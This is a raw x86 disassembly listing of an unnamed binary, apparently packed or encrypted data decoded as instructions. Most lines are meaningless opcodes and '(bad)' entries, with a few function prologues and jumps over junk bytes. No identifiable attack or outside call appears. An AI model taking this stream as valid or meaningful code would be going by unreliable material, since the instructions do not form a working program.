  40f192:	call   0x2b94:0xb2b2d343
  40f199:	adc    eax,0xae58adc9
  40f19e:	sub    al,0x8d
  40f1a0:	jns    0x40f1c9
  40f1a2:	popf   
  40f1a3:	add    DWORD PTR [eax-0x5b],edx
  40f1a6:	(bad)
  40f1aa:	das    
  40f1ab:	jo     0x40f146
  40f1ad:	(bad)  
  40f1af:	push   edi
  40f1b0:	or     al,0xbf
  40f1b2:	and    DWORD PTR [bx+0x536f],ecx
  40f1b7:	or     ch,BYTE PTR [ebp-0x6e]
  40f1ba:	and    al,0x50
  40f1bc:	inc    ebx
  40f1bd:	inc    edi
  40f1be:	push   es
  40f1bf:	push   0xb6a3921a
  40f1c4:	test   BYTE PTR ds:0x3e0dab19,bh
  40f1ca:	mov    esi,0xbc0ba53e
  40f1cf:	cli    
  40f1d0:	jnp    0x40f248
  40f1d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1d3:	cs sub ah,dh
  40f1d6:	(bad)  
  40f1d8:	dec    edx
  40f1d9:	jnp    0x40f19c
  40f1db:	vpor   xmm6,xmm5,XMMWORD PTR [esi+0x7e7daac8]
  40f1e3:	mov    bl,0x85
  40f1e5:	nop
  40f1e6:	(bad)  
  40f1e7:	xor    al,0x6c
  40f1e9:	lds    esi,FWORD PTR [edi+0x34b1f6c3]
  40f1ef:	data16 loop 0x40f245
  40f1f2:	sbb    ah,BYTE PTR [edi+ebp*4+0x2f5743ab]
  40f1f9:	scas   eax,DWORD PTR es:[edi]
  40f1fa:	iret   
  40f1fb:	lods   al,BYTE PTR ds:[esi]
  40f1fc:	xchg   DWORD PTR [eax+0x3e],esp
  40f1ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f200:	popf   
  40f201:	in     al,0xf7
  40f203:	cmp    edx,DWORD PTR [edi+edi*8-0xba651a0]
  40f20a:	cmc    
  40f20b:	inc    ebx
  40f20c:	aam    0x3a
  40f20e:	mov    esi,0x168432e3
  40f213:	sbb    dh,BYTE PTR [esi+0x5c3f6e8f]
  40f219:	sbb    al,0xf2
  40f21b:	dec    edi
  40f21c:	outs   dx,BYTE PTR ds:[esi]
  40f21d:	jo     0x40f1c0
  40f21f:	xor    al,0x47
  40f221:	xchg   esi,eax
  40f222:	mov    ds:0x65f5c44,eax
  40f227:	(bad)  
  40f228:	in     al,dx
  40f229:	js     0x40f21e
  40f22b:	mov    eax,0xe588be70
  40f230:	out    dx,eax
  40f231:	pop    ecx
  40f232:	mov    ebp,0xca1a78b4
  40f237:	fs mov ebp,0xbd35f35b
  40f23d:	sbb    esi,DWORD PTR [edi]
  40f23f:	in     al,dx
  40f240:	jb     0x40f239
  40f242:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f243:	add    DWORD PTR cs:[ecx+0x38ede938],esp
  40f24a:	xchg   esi,eax
  40f24b:	or     al,0x98
  40f24d:	cdq    
  40f24e:	cmp    ecx,esp
  40f250:	xchg   BYTE PTR [ebx-0x39],cl
  40f253:	sar    DWORD PTR [edx],cl
  40f255:	dec    ecx
  40f256:	or     BYTE PTR [ebp-0xc9f70d],dl
  40f25c:	jne    0x40f256
  40f25e:	push   DWORD PTR [ebp-0x4]
  40f261:	call   0x40937f
  40f266:	mov    eax,DWORD PTR [ebp-0x4]
  40f269:	xor    eax,edi
  40f26b:	pop    edi
  40f26c:	add    eax,esi
  40f26e:	jmp    0x40f634
  40f273:	xchg   ecx,eax
  40f274:	pushf  
  40f275:	out    0xec,al
  40f277:	icebp  
  40f278:	jbe    0x40f20b
  40f27a:	popa   
  40f27b:	out    dx,eax
  40f27c:	bound  ecx,QWORD PTR [edx+0x783b6bd9]
  40f282:	and    BYTE PTR [ecx-0x56],0x7c
  40f286:	jl     0x40f22f
  40f288:	jns    0x40f306
  40f28a:	jl     0x40f211
  40f28c:	dec    edi
  40f28d:	loop   0x40f2c7
  40f28f:	mov    ds:0xa000b18b,eax
  40f294:	mov    ds:0x97dc243b,al
  40f299:	ins    BYTE PTR es:[edi],dx
  40f29a:	in     al,0xe5
  40f29c:	imul   ebp
  40f29e:	sub    DWORD PTR ds:0x34a5f897,ebp
  40f2a4:	leave  
  40f2a5:	adc    DWORD PTR [ebx],ebx
  40f2a7:	pop    ds
  40f2a8:	mov    al,0x83
  40f2aa:	jae    0x40f234
  40f2ac:	test   DWORD PTR [ecx],edx
  40f2ae:	(bad)  
  40f2af:	push   eax
  40f2b0:	jmp    0x40f2e4
  40f2b2:	mov    dl,0x94
  40f2b4:	lods   al,BYTE PTR ds:[esi]
  40f2b5:	popa   
  40f2b6:	mov    dh,0x6d
  40f2b8:	fwait
  40f2b9:	call   0x834b:0x94155878
  40f2c0:	jno    0x40f2c6
  40f2c2:	gs mov ah,0x7d
  40f2c5:	mov    esp,DWORD PTR [edi]
  40f2c7:	scas   eax,DWORD PTR es:[edi]
  40f2c8:	mov    ecx,0x1bca42e
  40f2cd:	sbb    edx,DWORD PTR [edi+edi*4-0x5d]
  40f2d1:	mov    al,ds:0x75f43cbe
  40f2d6:	jmp    0x40f2ee
  40f2d8:	mov    edi,0xe7ae295f
  40f2dd:	std    
  40f2de:	jle    0x40f30f
  40f2e0:	fstp   TBYTE PTR [edi+0x1e]
  40f2e3:	pop    es
  40f2e4:	jmp    FWORD PTR [ebx+ecx*8+0x31]
  40f2e8:	sub    al,0x17
  40f2ea:	test   dh,dh
  40f2ec:	adc    esp,DWORD PTR [eax+0x47]
  40f2ef:	retf   
  40f2f0:	les    ecx,FWORD PTR [esi]
  40f2f2:	inc    DWORD PTR [ebx]
  40f2f4:	dec    edi
  40f2f5:	dec    ecx
  40f2f6:	jmp    edx
  40f2f8:	das    
  40f2f9:	or     BYTE PTR [edx+ebp*4+0x66a5cc27],cl
  40f300:	ficom  WORD PTR [edx-0x55a9f66d]
  40f306:	jb     0x40f2e2
  40f308:	add    ebx,0xffffff93
  40f30b:	call   0xfed4:0x691cb305
  40f312:	hlt    
  40f313:	fcom   st(1)
  40f315:	and    eax,ebx
  40f317:	lock aam 0xa
  40f31a:	or     ch,BYTE PTR [esp+eiz*4+0x24]
  40f31e:	or     al,0x56
  40f320:	sti    
  40f321:	adc    al,0x3e
  40f323:	daa    
  40f324:	sub    eax,0xbab78ae
  40f329:	jne    0x40f2e3
  40f32b:	mov    edi,fs
  40f32d:	test   eax,0xbb8455a2
  40f332:	in     eax,0x5
  40f334:	lock repnz dec ecx
  40f337:	adc    BYTE PTR [eax],0x34
  40f33a:	in     eax,dx
  40f33b:	push   ds
  40f33c:	jnp    0x40f364
  40f33e:	in     al,0x7e
  40f340:	aas    
  40f341:	outs   dx,BYTE PTR ds:[esi]
  40f342:	bound  esp,QWORD PTR [ebp+0x24]
  40f345:	hlt    
  40f346:	jp     0x40f34b
  40f348:	jbe    0x40f2e2
  40f34a:	fcomp  DWORD PTR [eax-0x291e641c]
  40f350:	shr    BYTE PTR [ecx-0x5],cl
  40f353:	mov    ch,0xd5
  40f355:	ret    0x734c
  40f358:	cdq    
  40f359:	daa    
  40f35a:	(bad)  
  40f35b:	addr16 aam 0x8c
  40f35e:	scas   al,BYTE PTR es:[edi]
  40f35f:	and    al,0xdd
  40f361:	test   al,bl
  40f363:	mov    DWORD PTR ds:0xe045f3c7,0x18c684c0
  40f36d:	imul   edx,eax,0x274091f8
  40f373:	fcmovne st,st(0)
  40f375:	daa    
  40f376:	push   ecx
  40f377:	das    
  40f378:	xor    DWORD PTR [edx-0x1c7061f9],edi
  40f37e:	in     al,dx
  40f37f:	add    cl,BYTE PTR [esi-0x59]
  40f382:	adc    cl,BYTE PTR [edi-0x22420d45]
  40f388:	data16 sbb ah,bh
  40f38b:	(bad)
  40f38f:	xchg   esp,eax
  40f390:	inc    edi
  40f391:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f392:	imul   esi,DWORD PTR [edi],0x42b255e9
  40f398:	aas    
  40f399:	arpl   di,bp
  40f39b:	mov    ebp,DWORD PTR [esi+0x2c]
  40f39e:	nop
  40f39f:	pop    ebp
  40f3a0:	xchg   esp,eax
  40f3a1:	pop    edi
  40f3a2:	loope  0x40f3e6
  40f3a4:	in     eax,dx
  40f3a5:	cli    
  40f3a6:	xchg   edx,eax
  40f3a7:	outs   dx,DWORD PTR ds:[esi]
  40f3a8:	shl    eax,cl
  40f3aa:	and    al,BYTE PTR [eax]
  40f3ac:	les    esi,FWORD PTR [eax]
  40f3ae:	ficomp DWORD PTR ds:0x7009819f
  40f3b4:	fucom  st(1)
  40f3b6:	add    bh,BYTE PTR [ecx-0x4d29395f]
  40f3bc:	fwait
  40f3bd:	les    esi,FWORD PTR [ebx-0x69638dec]
  40f3c3:	jb     0x40f35c
  40f3c5:	mov    eax,0x38e5d2e1
  40f3ca:	retf   
  40f3cb:	mov    DWORD PTR [ecx+0x69],ebx
  40f3ce:	fwait
  40f3cf:	(bad)  
  40f3d0:	scas   al,BYTE PTR es:[edi]
  40f3d1:	test   al,0x95
  40f3d3:	pop    ebx
  40f3d4:	fsubr  QWORD PTR [edi-0x379556ed]
  40f3da:	daa    
  40f3db:	or     eax,0x4a1877e8
  40f3e0:	mov    bh,0xb1
  40f3e2:	mov    dh,BYTE PTR ss:[ecx+0x1]
  40f3e6:	loope  0x40f378
  40f3e8:	adc    esp,DWORD PTR gs:[ebp-0x7fa88fff]
  40f3ef:	ins    BYTE PTR es:[edi],dx
  40f3f0:	fisubr DWORD PTR [eax-0x198c674f]
  40f3f6:	mov    esp,0xc541d15e
  40f3fb:	ficomp WORD PTR [ebp+0x20]
  40f3fe:	pop    eax
  40f3ff:	mov    ecx,0x1d4de3fb
  40f404:	or     ebp,ecx
  40f406:	cwde   
  40f407:	iret   
  40f408:	cmp    eax,0x8ae4eb92
  40f40d:	xlat   BYTE PTR ds:[ebx]
  40f40e:	fs ret 0xe3c4
  40f412:	xchg   ebx,eax
  40f413:	or     eax,0xb0678ffe
  40f418:	test   BYTE PTR [esp+eax*4-0x5f626fb1],ah
  40f41f:	inc    ecx
  40f420:	sti    
  40f421:	cmc    
  40f422:	mov    eax,0xee5c675d
  40f427:	dec    ebx
  40f428:	(bad)  
  40f429:	pop    ss
  40f42a:	sahf   
  40f42b:	inc    esi
  40f42c:	push   ebp
  40f42d:	lods   eax,DWORD PTR ds:[esi]
  40f42e:	imul   edi,DWORD PTR [ecx-0x6c97f8eb],0x34
  40f435:	mov    ecx,0x83aaeb61
  40f43a:	scas   eax,DWORD PTR es:[edi]
  40f43b:	scas   al,BYTE PTR es:[edi]
  40f43c:	cmp    bl,BYTE PTR [eax]
  40f43e:	jmp    0x8ee2:0x84bb3380
  40f445:	pop    eax
  40f446:	push   cs
  40f447:	add    bl,dh
  40f449:	in     eax,dx
  40f44a:	js     0x40f4c2
  40f44c:	icebp  
  40f44d:	cmp    BYTE PTR [ecx+esi*1+0x5122fbf6],dh
  40f454:	sub    BYTE PTR es:[ebp+0x2872822],0xaf
  40f45c:	pop    ebp
  40f45d:	push   ss
  40f45e:	dec    ebp
  40f45f:	add    eax,0xc134fcfe
  40f464:	inc    edi
  40f465:	std    
  40f466:	adc    ah,BYTE PTR [eax-0x54]
  40f469:	in     eax,0x38
  40f46b:	retf   0xe775
  40f46e:	inc    edi
  40f46f:	repz out 0x92,eax
  40f472:	xor    al,0x34
  40f474:	add    DWORD PTR [edi],esi
  40f476:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f477:	outs   dx,DWORD PTR ds:[esi]
  40f478:	push   0xffffff9f
  40f47a:	in     al,0x99
  40f47c:	sub    DWORD PTR [edi],ebp
  40f47e:	mov    bl,BYTE PTR [eax+0x28af6b5f]
  40f484:	cmp    bl,bl
  40f486:	jmp    0xcd8124d8
  40f48b:	hlt    
  40f48c:	jp     0x40f4a2
  40f48e:	sub    ebp,DWORD PTR [ecx]
  40f490:	adc    bl,BYTE PTR [edi+eax*4]
  40f493:	(bad)  
  40f494:	sub    BYTE PTR [esi+0x5040754b],al
  40f49a:	mov    ebp,0x31888715
  40f49f:	adc    DWORD PTR [edi+0x368da1c2],ecx
  40f4a5:	dec    esi
  40f4a6:	inc    ebp
  40f4a7:	fcom   DWORD PTR [ebp-0x52]
  40f4aa:	push   ecx
  40f4ab:	popa   
  40f4ac:	or     eax,0x7f18d164
  40f4b1:	loope  0x40f4f7
  40f4b3:	les    ebp,FWORD PTR [eax+0x2e7048ba]
  40f4b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4ba:	mov    ebp,0xbf95174a
  40f4bf:	test   al,0x1a
  40f4c1:	sbb    al,0xd4
  40f4c3:	cmp    BYTE PTR [ecx-0x66],al
  40f4c6:	jp     0x40f52a
  40f4c8:	add    al,0x79
  40f4ca:	fld    DWORD PTR [ebx-0x3862aee0]
  40f4d0:	mov    esp,0xf010e6ba
  40f4d5:	jb     0x40f482
  40f4d7:	sbb    eax,0xf5389708
  40f4dc:	xor    bh,BYTE PTR [esi+ebx*1]
  40f4df:	je     0x40f4d5
  40f4e1:	inc    ebp
  40f4e2:	jmp    0x4b3d:0x7c339abf
  40f4e9:	aad    0xe9
  40f4eb:	jbe    0x40f4ec
  40f4ed:	xchg   ebp,eax
  40f4ee:	(bad)  
  40f4ef:	les    eax,FWORD PTR [edx-0x1d]
  40f4f2:	fdiv   DWORD PTR [eax]
  40f4f4:	pop    ecx
  40f4f5:	les    eax,FWORD PTR [esi]
  40f4f7:	jl     0x40f546
  40f4f9:	pushf  
  40f4fa:	cmp    DWORD PTR [edi+0x7ba451b9],esi
  40f500:	pop    ds
  40f501:	(bad)  [edx]
  40f503:	call   0x76c3:0x1a72005f
  40f50a:	jecxz  0x40f523
  40f50c:	gs pop ebp
  40f50e:	dec    DWORD PTR [edi+eax*1-0x7]
  40f512:	mov    edx,0x98b503fd
  40f517:	push   ebp
  40f518:	cs push edi
  40f51a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f51b:	push   edx
  40f51c:	js     0x40f56d
  40f51e:	sbb    eax,0xe811d7b4
  40f523:	pop    ecx
  40f524:	pop    ebx
  40f525:	push   ecx
  40f526:	and    ebx,DWORD PTR [esi+0x5d3ab8b2]
  40f52c:	es dec esp
  40f52e:	lahf   
  40f52f:	pusha  
  40f530:	fs pushf 
  40f532:	inc    edx
  40f533:	xlat   BYTE PTR ds:[ebx]
  40f534:	dec    ebp
  40f535:	mov    dh,0x30
  40f537:	out    0x27,al
  40f539:	loopne 0x40f503
  40f53b:	scas   al,BYTE PTR es:[edi]
  40f53c:	inc    edx
  40f53d:	out    0x83,al
  40f53f:	in     al,dx
  40f540:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f541:	sbb    eax,DWORD PTR [eax+0x27]
  40f544:	imul   edi,DWORD PTR [ecx+0x3f],0xb7094674
  40f54b:	dec    eax
  40f54c:	jmp    0x9a6e:0x44b1c624
  40f553:	adc    edx,DWORD PTR [edx]
  40f555:	loope  0x40f57a
  40f557:	or     eax,0xe0e6901e
  40f55c:	je     0x40f57c
  40f55e:	xlat   BYTE PTR ds:[ebx]
  40f55f:	adc    al,0x5e
  40f561:	add    BYTE PTR [ebp-0x5f],ah
  40f564:	in     eax,dx
  40f565:	pop    eax
  40f566:	imul   edi,DWORD PTR [ecx],0x48
  40f569:	repnz cmp BYTE PTR [ebx+0x3eba4faf],dh
  40f570:	shr    edx,0x2a
  40f573:	pop    ss
  40f574:	(bad)  
  40f575:	push   eax
  40f576:	stc    
  40f577:	dec    edi
  40f578:	ffree  st(2)
  40f57a:	xor    DWORD PTR [eax-0x29],eax
  40f57d:	push   edx
  40f57e:	inc    edx
  40f57f:	cld    
  40f580:	inc    esp
  40f581:	icebp  
  40f582:	jne    0x40f520
  40f584:	mov    dh,0xa7
  40f586:	push   esp
  40f587:	mov    WORD PTR [eax+ebx*1],fs
  40f58a:	dec    ebp
  40f58b:	mov    ds:0x1da0b767,eax
  40f590:	enter  0x4e0f,0x77
  40f594:	out    0xb3,al
  40f596:	stc    
  40f597:	scas   eax,DWORD PTR es:[edi]
  40f598:	cs adc edi,ebp
  40f59b:	ins    BYTE PTR es:[edi],dx
  40f59c:	loope  0x40f5ec
  40f59e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f59f:	in     eax,dx
  40f5a0:	mov    esi,0x26859136
  40f5a5:	(bad)
  40f5a8:	pop    ds
  40f5a9:	ins    BYTE PTR es:[edi],dx
  40f5aa:	lods   al,BYTE PTR ds:[esi]
  40f5ab:	call   0x2b6c494e
  40f5b0:	f2xm1  
  40f5b2:	nop
  40f5b3:	or     DWORD PTR [ecx-0x650f31e6],0x4da26e76
  40f5bd:	loopne 0x40f58a
  40f5bf:	xchg   esi,eax
  40f5c0:	into   
  40f5c1:	jns    0x40f5db
  40f5c3:	or     eax,0xafde5137
  40f5c8:	sbb    eax,0xef6cd9e5
  40f5cd:	int3   
  40f5ce:	or     eax,0x2cc143e0
  40f5d3:	sbb    ch,cl
  40f5d5:	dec    esi
  40f5d6:	cdq    
  40f5d7:	mov    ebx,0x6923d064
  40f5dc:	shr    DWORD PTR [edi+0x4c],cl
  40f5df:	ret    0xc891
  40f5e2:	adc    al,0x1d
  40f5e4:	jnp    0x40f596
  40f5e6:	xchg   ebx,eax
  40f5e7:	mul    DWORD PTR [edx]
  40f5e9:	out    dx,eax
  40f5ea:	ja     0x40f58b
  40f5ec:	xchg   edx,eax
  40f5ed:	mov    ebx,DWORD PTR [ebx+0x70]
  40f5f0:	xchg   DWORD PTR [edi],esp
  40f5f2:	xor    edi,DWORD PTR [edx+0x1e715912]
  40f5f8:	add    edx,DWORD PTR [eax+0x5b15927b]
  40f5fe:	jbe    0x40f651
  40f600:	or     eax,0xa2476a5
  40f605:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f606:	icebp  
  40f607:	loopne 0x40f5bb
  40f609:	ins    DWORD PTR es:[edi],dx
  40f60a:	cld    
  40f60b:	retf   
  40f60c:	jbe    0x40f646
  40f60e:	push   ds
  40f60f:	jns    0x40f648
  40f611:	mov    cs,ecx
  40f613:	fucomip st,st(6)
  40f615:	mov    WORD PTR [edi-0x58742fe0],es
  40f61b:	push   esi
  40f61c:	pop    eax
  40f61d:	pop    ds
  40f61e:	pop    edx
  40f61f:	int    0xb8
  40f621:	shr    bl,cl
  40f623:	jmp    0x3f3b7dc9
  40f628:	and    dl,BYTE PTR [ecx+0x48182fb]
  40f62e:	xor    DWORD PTR [eax-0x23],ecx
  40f631:	dec    esi
  40f632:	test   al,0x9f
  40f634:	pop    esi
  40f635:	leave  
  40f636:	ret    0xc
  40f639:	push   ebp
  40f63a:	mov    ebp,esp
  40f63c:	push   ecx
  40f63d:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40f644:	mov    eax,DWORD PTR [ebp+0x8]
  40f647:	sbb    DWORD PTR ds:0x43376f,0x1bf0
  40f651:	mov    al,BYTE PTR [eax]
  40f653:	and    DWORD PTR ds:0x43375f,0x433723
  40f65d:	jmp    0x40f925
  40f662:	pop    es
  40f663:	sbb    DWORD PTR [edx],ebp
  40f665:	pop    ecx
  40f666:	xor    dh,BYTE PTR [ebp+0x53]
  40f669:	popa   
  40f66a:	inc    eax
  40f66b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f66c:	push   esi
  40f66d:	call   0xb688:0x213a034a
  40f674:	jl     0x40f6f2
  40f676:	mov    eax,ds:0xb17c7c7e
  40f67b:	jl     0x40f6a4
  40f67d:	rcr    DWORD PTR [eax+0x10],1
  40f680:	in     al,0x90
  40f682:	pop    es
  40f683:	(bad)  
  40f684:	fisttp DWORD PTR [edi]
  40f686:	dec    ecx
  40f687:	sbb    ebx,eax
  40f689:	ror    ecx,1
  40f68b:	inc    edx
  40f68c:	sbb    BYTE PTR [esi],ah
  40f68e:	test   DWORD PTR [ebp-0x8cb3eca],esp
  40f694:	push   cs
  40f695:	cs push esi
  40f697:	icebp  
  40f698:	adc    cl,BYTE PTR [ecx]
  40f69a:	(bad)  
  40f69b:	pop    esp
  40f69c:	sbb    edx,ebx
  40f69e:	sbb    BYTE PTR [eax+0x78],ah
  40f6a1:	sub    DWORD PTR [ecx],0x6c2fc8d2
  40f6a7:	rol    edx,cl
  40f6a9:	ret    
  40f6aa:	jle    0x40f71d
  40f6ac:	sti    
  40f6ad:	ja     0x40f6d3
  40f6af:	sbb    DWORD PTR ds:0x69566a67,eax
  40f6b5:	lods   eax,DWORD PTR ds:[esi]
  40f6b6:	jo     0x40f63f
  40f6b8:	retf   
  40f6b9:	aas    
  40f6ba:	mov    bl,0x72
  40f6bc:	push   0xd0f198ba
  40f6c1:	ja     0x40f675
  40f6c3:	(bad)  
  40f6c5:	shl    BYTE PTR [ebx-0x4f94a7f2],0xe
  40f6cc:	jns    0x40f6b0
  40f6ce:	add    eax,0xc7f0b6cf
  40f6d3:	icebp  
  40f6d4:	xchg   BYTE PTR ds:0x9f10cf34,cl
  40f6da:	xchg   BYTE PTR [edi-0x5264203a],ah
  40f6e0:	ficom  DWORD PTR [edx-0x70]
  40f6e3:	les    ecx,FWORD PTR [edx]
  40f6e5:	cmp    ebx,DWORD PTR [ebx+0x19]
  40f6e8:	das    
  40f6e9:	mov    ds:0x6e8e1db2,al
  40f6ee:	and    al,0xb2
  40f6f0:	or     dl,dl
  40f6f2:	stc    
  40f6f3:	sti    
  40f6f4:	pusha  
  40f6f5:	pop    ebp
  40f6f6:	cld    
  40f6f7:	push   ecx
  40f6f8:	cli    
  40f6f9:	or     al,0x32
  40f6fb:	jmp    0x40f76a
  40f6fd:	enter  0xc63c,0x38
  40f701:	ret    0x413
  40f704:	outs   dx,DWORD PTR ds:[esi]
  40f705:	(bad)  
  40f706:	dec    ebx
  40f707:	add    dh,BYTE PTR [esp+ebp*4+0x4b12f43f]
  40f70e:	push   cs
  40f70f:	fidivr DWORD PTR [ebx+0x7b]
  40f712:	sbb    edx,DWORD PTR [esp+eax*8]
  40f715:	add    BYTE PTR [edx-0x70ea02c],0x16
  40f71c:	jmp    0x96f014b3
  40f721:	icebp  
  40f722:	push   ecx
  40f723:	out    dx,eax
  40f724:	retf   
  40f725:	adc    DWORD PTR [edi],esp
  40f727:	test   al,0x25
  40f729:	and    DWORD PTR [esi+ebx*2],edi
  40f72c:	and    al,0x22
  40f72e:	pop    ebp
  40f72f:	imul   ebp,edx,0x5a90f58
  40f735:	xchg   edx,eax
  40f736:	xor    eax,0xefe69d21
  40f73b:	nop
  40f73c:	or     DWORD PTR [edi-0x422c9cbd],esp
  40f742:	in     al,0x26
  40f744:	mov    dh,0x11
  40f746:	or     eax,0xcef9457a
  40f74b:	test   ch,al
  40f74d:	cli    
  40f74e:	adc    ah,BYTE PTR [ebp-0x46]
  40f751:	xor    al,0x43
  40f753:	add    cl,dl
  40f755:	xlat   BYTE PTR ds:[ebx]
  40f756:	or     bl,BYTE PTR [edi]
  40f758:	ss addr16 jp 0x40f722
  40f75c:	lds    edi,FWORD PTR [edi+0x25]
  40f75f:	sbb    DWORD PTR [ebx+0x5dd8e75],edi
  40f765:	pusha  
  40f766:	test   al,0x28
  40f768:	dec    eax
  40f769:	push   ds
  40f76a:	les    esi,FWORD PTR [ebx+0x4753ca2c]
  40f770:	sbb    al,0x2b
  40f772:	sub    eax,edi
  40f774:	mov    esi,0x7b0eb872
  40f779:	xchg   ecx,eax
  40f77a:	scas   eax,DWORD PTR es:[edi]
  40f77b:	ja     0x40f73a
  40f77d:	in     eax,0x73
  40f77f:	push   ss
  40f780:	push   ebp
  40f781:	and    al,0x9a
  40f783:	pop    edi
  40f784:	xor    bl,BYTE PTR [edx-0x3142d4c5]
  40f78a:	dec    esp
  40f78b:	mov    esp,0x8b4f3192
  40f790:	lods   eax,DWORD PTR ds:[esi]
  40f791:	inc    BYTE PTR [esi]
  40f793:	daa    
  40f794:	pop    edx
  40f795:	sbb    dl,bh
  40f797:	mov    al,ds:0x85c893e6
  40f79c:	adc    DWORD PTR [eax],eax
  40f79e:	aaa    
  40f79f:	dec    edx
  40f7a0:	sub    BYTE PTR [esi+eiz*8+0x44],bh
  40f7a4:	int3   
  40f7a5:	sbb    eax,DWORD PTR [edi+0x4e096187]
  40f7ab:	les    ebx,FWORD PTR [esi]
  40f7ad:	sbb    eax,0xad8bc64a
  40f7b2:	loop   0x40f744
  40f7b4:	fs aam 0xf9
  40f7b7:	fwait
  40f7b8:	lock xor eax,0x399347d5
  40f7be:	add    DWORD PTR [edi+eax*1],eax
  40f7c1:	jmp    0x40f7db
  40f7c3:	mov    al,0xb5
  40f7c5:	call   0x89bc:0xbaa62bac
  40f7cc:	aaa    
  40f7cd:	test   BYTE PTR [ebx+0x23],bl
  40f7d0:	sbb    cl,BYTE PTR [edi]
  40f7d2:	xchg   esp,eax
  40f7d3:	mov    bl,0xd7
  40f7d5:	xchg   ecx,eax
  40f7d6:	sub    BYTE PTR [esi+ecx*2],bh
  40f7d9:	add    esp,DWORD PTR [ecx+0x76bb6c2e]
  40f7df:	fwait
  40f7e0:	adc    al,0x35
  40f7e2:	push   0xe67c5935
  40f7e7:	adc    dh,BYTE PTR ds:0xd99000a1
  40f7ed:	cmp    dh,dh
  40f7ef:	sub    eax,0xaf2fe421
  40f7f4:	out    0xa7,al
  40f7f6:	sbb    al,0xd1
  40f7f8:	lds    esp,FWORD PTR [ecx-0x742c1a45]
  40f7fe:	mov    edx,0xd814e373
  40f803:	push   edx
  40f804:	push   es
  40f805:	ins    BYTE PTR es:[edi],dx
  40f806:	out    dx,eax
  40f807:	sub    al,0x23
  40f809:	mov    ds:0x13a1cb00,al
  40f80e:	rcl    BYTE PTR [eax-0x137d3f3f],1
  40f814:	dec    ebp
  40f815:	cwde   
  40f816:	test   edi,esp
  40f818:	sub    BYTE PTR [edi],bh
  40f81a:	aam    0xc1
  40f81c:	aad    0x50
  40f81e:	int3   
  40f81f:	mov    eax,0x72cd0cd8
  40f824:	xchg   ecx,eax
  40f825:	xchg   edi,eax
  40f826:	xor    DWORD PTR [edi+edx*4],0xffffffda
  40f82a:	mov    WORD PTR [esi-0x5e07955a],ss
  40f830:	loop   0x40f7d9
  40f832:	jmp    0x40f8af
  40f834:	enter  0xd623,0xca
  40f838:	loope  0x40f82f
  40f83a:	jo     0x40f865
  40f83c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f83d:	mov    edx,0xf2b3989
  40f842:	popa   
  40f843:	int3   
  40f844:	and    DWORD PTR [ecx-0x7b0da635],edi
  40f84a:	loope  0x40f89b
  40f84c:	pusha  
  40f84d:	sbb    edi,DWORD PTR [edx]
  40f84f:	shl    BYTE PTR [eax+0x23a73bf2],0x4a
  40f856:	int    0x7f
  40f858:	mov    ss,WORD PTR [edi-0x29]
  40f85b:	shl    DWORD PTR [ebp+0xc508528],1
  40f861:	mov    dh,0x2d
  40f863:	and    bh,dl
  40f865:	in     al,dx
  40f866:	xor    DWORD PTR [ebx],eax
  40f868:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f869:	shr    BYTE PTR [ebx-0x68],1
  40f86c:	lods   eax,DWORD PTR ds:[esi]
  40f86d:	sbb    ebx,DWORD PTR [edx+0x4dd3a828]
  40f873:	xchg   ecx,eax
  40f874:	sub    BYTE PTR [esi-0x4e],ch
  40f877:	cs daa 
  40f879:	popf   
  40f87a:	push   esp
  40f87b:	dec    ecx
  40f87c:	aaa    
  40f87d:	inc    esi
  40f87e:	push   edi
  40f87f:	add    BYTE PTR [ebp-0x66],ch
  40f882:	stos   BYTE PTR es:[edi],al
  40f883:	sub    bh,BYTE PTR [eax]
  40f885:	fdivr  QWORD PTR ds:0xe121c0b4
  40f88b:	or     al,0xb4
  40f88d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f88e:	sub    BYTE PTR [esi+ebx*8-0x7c],cl
  40f892:	outs   dx,DWORD PTR ds:[esi]
  40f893:	xchg   DWORD PTR [edi+0x37],edi
  40f896:	enter  0x508c,0x42
  40f89a:	mov    ebx,0x770c8005
  40f89f:	inc    edx
  40f8a0:	sbb    BYTE PTR [ebx],bl
  40f8a2:	test   eax,0xbbb6ee0f
  40f8a7:	lods   al,BYTE PTR ds:[esi]
  40f8a8:	mov    dh,ch
  40f8aa:	cmp    eax,DWORD PTR [ebx-0x4d70305a]
  40f8b0:	or     bl,ch
  40f8b2:	mov    esi,0xbe516edd
  40f8b7:	fist   DWORD PTR [ecx+0x226decdc]
  40f8bd:	sub    dl,BYTE PTR [esp+ebp*8+0x54c8daa1]
  40f8c4:	jl     0x40f8c6
  40f8c6:	pop    ebp
  40f8c7:	das    
  40f8c8:	mov    bh,0xf
  40f8ca:	fld    QWORD PTR [eax+0x1]
  40f8cd:	rcl    edi,0x5f
  40f8d0:	adc    al,0xd5
  40f8d2:	jl     0x40f87b
  40f8d4:	ret    
  40f8d5:	pop    ss
  40f8d6:	call   0x4a085ad7
  40f8db:	adc    dh,BYTE PTR [esi-0x1c182e48]
  40f8e1:	rcl    BYTE PTR [edi-0x2f],cl
  40f8e4:	cmp    BYTE PTR [edx+0x5c],cl
  40f8e7:	mov    ds,WORD PTR [edx+0xf]
  40f8ea:	shl    DWORD PTR [eax],1
  40f8ec:	adc    DWORD PTR [edi-0x67],0x42
  40f8f0:	adc    al,0x12
  40f8f2:	inc    ecx
  40f8f3:	xor    BYTE PTR [esi-0x22],al
  40f8f6:	push   0xffffff8a
  40f8f8:	mov    bh,0x4a
  40f8fa:	push   0x3d
  40f8fc:	mov    bh,0xd3
  40f8fe:	sbb    eax,0xdc08b5ba
  40f903:	les    edx,FWORD PTR [ebx+0x1b]
  40f906:	in     eax,dx
  40f907:	in     eax,dx
